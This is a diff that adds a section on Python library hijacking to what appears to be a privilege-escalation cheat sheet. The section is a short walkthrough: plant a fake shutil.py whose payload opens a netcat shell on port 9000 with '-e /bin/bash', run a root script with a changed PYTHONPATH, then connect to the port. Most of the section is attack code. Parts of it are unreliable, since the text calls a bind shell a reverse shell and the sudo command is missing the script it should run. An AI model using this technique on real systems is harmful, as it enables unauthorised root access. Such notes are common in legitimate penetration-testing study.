@@ -142,3 +142,17 @@ find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/gam
 ```
 
 ### Python library hijacking
+Let's say a python script is executed as root and uses the library shutil. To hijack the file and get a root shell, create a shutil.py file, re-create the method that is called but put in a reverse shell command. For example, say it calls the make_archive method of shutil, then our shutil.py would look something like this:
+```python
+import os
+
+os.system("nc -lvp 9000 -e /bin/bash")
+```
+Next whatever directory this is in, we'll have to add it to the python path so it will be called instead of the standard shutil library.
+```bash
+sudo -E PYTHONPATH=$(pwd)
+```
+Once the script runs, connect to the port:
+```
+rlwrap nc IP 9000
+```
